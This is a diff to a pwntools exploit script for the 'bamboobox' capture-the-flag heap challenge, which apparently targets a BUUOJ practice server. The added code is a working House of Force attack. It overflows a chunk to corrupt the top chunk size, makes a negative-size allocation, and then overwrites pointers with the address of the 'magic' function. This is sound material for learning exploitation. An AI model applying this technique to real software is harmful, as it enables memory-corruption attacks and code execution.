@@ -28,14 +28,34 @@ uu64    = lambda data               :u64(data.ljust(8,'\0'))
 leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
 
 context.log_level = 'DEBUG'
-binary = './pwn'
+binary = './bamboobox'
 context.binary = binary
 elf = ELF(binary)
-p = remote('node3.buuoj.cn',29776) if argv[1]=='r' else process(binary)
-libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+p = remote('node3.buuoj.cn', 26500) if argv[1]=='r' else process(binary)
+# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 
 # start
+def add(len,content='a'):
+	sla('choice:','2')
+	sla('name:',str(len))
+	sa('item:',content)
+def delete(index):
+	sla('choice:','4')
+	sla('item:',str(index))
+def edit(index,len,content):
+	sla('choice:','3')
+	sla('item:',str(index))
+	sla('name:',str(len))
+	sa('item:',content)
+def show():
+	sla('choice:','1')
 
+add(0x60)
+edit(0,0x70,flat('a'*0x60,0,0xffffffffffffffff))
+evil_size = -(0x60+0x10) - (0x10+0x10) - 0x10
+add(evil_size)
+add(0x10,p64(elf.sym['magic'])*2)
+sla('choice:','5')
 # end
 
 itr()
